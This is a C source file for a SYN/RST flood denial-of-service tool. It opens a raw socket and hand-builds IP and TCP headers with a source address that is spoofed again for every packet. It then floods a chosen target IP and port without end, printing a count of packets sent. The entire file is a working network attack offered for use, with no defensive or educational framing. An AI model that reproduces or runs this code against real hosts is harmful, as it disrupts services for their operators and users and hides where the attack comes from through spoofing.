#include <stdio.h>

#include "func.c" //All used functions for this program

char srcip[16]; /*Source IP for spoofing*/
int port;
unsigned long int pkt_count = 0; /*Packet counter*/
int check_helper = 0;
int soc;

int main(int argc, char *argv[]) {

  char* target;
  char* data;
  char* port_str;
  // int port;
  int choice;
  int synFlag = 0;
  int rstFlag = 0;
  int got_target = 0;
  int got_port = 0;
  int got_rst = 0;
  int option_found = 0;

  /*Signal handling for stopping the while loop*/
  struct sigaction sa;
  sa.sa_handler = &myHandler;
  sigfillset(&sa.sa_mask);
  if(signal(SIGINT, myHandler) == SIG_ERR)
    printf("Error catching SIGINT!\n");

    while ((choice = getopt(argc, argv, "p:t:r")) != -1)
    {
      switch (choice)
      {
          case 't' :
          got_target = 1;
          target = optarg;
          option_found++;
          break;
        case 'p' :
          got_port = 1;
          port_str = optarg;
          option_found++;
          break;
        case 'r' :
          got_rst = 1;
          break;
        default :
        if (optopt == 'p')
          fprintf (stderr, "Option -%c requires an argument.\n", optopt);
        break;
        if (optopt == 't')
          fprintf (stderr, "Option -%c requires an argument.\n", optopt);
        break;
      }
  }
  if(!got_target)
    target = "127.0.0.1";
  if(!got_port)
    port_str = "80";
  if(got_rst){
    rstFlag = 1;
    check_helper = 543;
  }
  else{
    synFlag = 1;
    check_helper = 31;
  }


  port = strtoint(port_str);

  char* rst = got_rst ? "RST" : "Syn-Flood";
  printf("Port = %s\nTarget = %s\nMode: %s\n", port_str, target, rst);


  if(!validIP(target))
  {
    printf("ERROR! Invalid IP address!\n");
    exit(1);
  }


  //////////////////////////////////////////
  /* Beginning of the communication part:*/
  ////////////////////////////////////////

  char* psdgram;

  //Creating a raw socket over TCP
  soc = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

  //The datagram (packet)
  char datagram[DATAGRAM_SIZE];

  //Struct of the IP header
  struct iphdr *iph = (struct iphdr*) datagram;

  //Struct of the TCP header
  struct tcphdr *tcph = (struct tcphdr*)(datagram + sizeof(struct ip));//WAS struct ip
  struct sockaddr_in sin;
  struct pseudoHeader psh;

  sin.sin_family = AF_INET;
  sin.sin_port = htons(80);
  sin.sin_addr.s_addr = inet_addr(target);

  //Initializing datagram to be zeros
  memset(datagram, 0, DATAGRAM_SIZE);

  //Filling the IP header
  iph->ihl = 5;
  iph->version = 4; //IPv4
  iph->tos = 0;
  iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
  iph->id = htons(5555); //Needed for fragmentation. Doesn't matter here.
  iph->frag_off = 0; //No fragremtation, so the offset is zero.
  iph->ttl = 255; //Time to live.
  iph->protocol = IPPROTO_TCP; // TCP protocol
  iph->check = 0; //Checksum to be calculated
  iph->saddr = inet_addr(spoof()); //Spoofed source address
  iph->daddr = sin.sin_addr.s_addr; //Destination
  /*Casting the datagram to 16 bits*/
  iph->check = checkSum((unsigned short*)datagram, iph->tot_len >> 1);



  //TCP header
  tcph->source = htons(1111);//Source port
  tcph->dest = htons(port);//Destination port
  tcph->seq = 0; //Packet sequence number
  tcph->ack_seq = 0; //Packet acknowledgement number
  tcph->doff = 5; //Data offset
  /*Flags settings*/
  tcph->syn=synFlag;
  tcph->rst=rstFlag;
  tcph->fin=0;
  tcph->psh=0;
  tcph->ack=0;
  tcph->urg=0;
  tcph->urg_ptr = 0;
  tcph->window = htons (5840); // Maximum window size
  tcph->check = 0;

  //Pseudo header
  psh.sourceAddress = inet_addr(srcip);
  psh.destAddress = sin.sin_addr.s_addr;
  psh.placeHolder = 0; //Saved for future options
  psh.protocol = IPPROTO_TCP;
  psh.tcpLength = htons(20);  //TCP header length

  memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

  tcph->check = checkSum((unsigned short*)&psh, sizeof(struct pseudoHeader));

  /*The following line's role is to tell the kernel that the
  IP header is included wihtin, so it would fill the data link layer
  information for us (such as source and next hop)*/
  int un = 1;
  const int* val = &un;
  if (setsockopt (soc, IPPROTO_IP, IP_HDRINCL, val, sizeof (un)) < 0)
  {
    printf("Error! Try typing \"sudo %s\"\n",argv[0]); //Error with IP_HDRINCL
    exit(0);
  }

  while(1)
  {
  if (sendto (soc,      //The socket
    datagram,   //The buffer with the data and the headers
    iph->tot_len,    //Total length (of the datagram)
    0,      //Routing flags. Almost always zero
    (struct sockaddr *) &sin, sizeof (sin)) < 0)   //The socket address, like the function send()
    {
      printf("Error sending packet!\n");
      fprintf(stderr, "Value of errno: %d\n", errno);
      break;
    }
    //Data send successfully
    else
    {
      printf ("Packet Sent from %s to the target\n", srcip);
      printf("packet number %zu\n",pkt_count);

      pkt_count++;
    }

    spoof(); //Spoofing srcip
    /*Setting checksums again to zero*/
    iph->check = 0;
    iph->saddr = inet_addr(srcip);
    iph->check = checkSum((unsigned short*)datagram, iph->tot_len >> 1);

    tcph->check = 0;
    tcph->source = htons(randomPort());
    // tcph->source = htons(1500);
    psh.sourceAddress = inet_addr(srcip);


    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

    tcph->check = checkSum( (unsigned short*) &psh , sizeof (struct pseudoHeader));

  }

  // close(s);

  return 0;
}
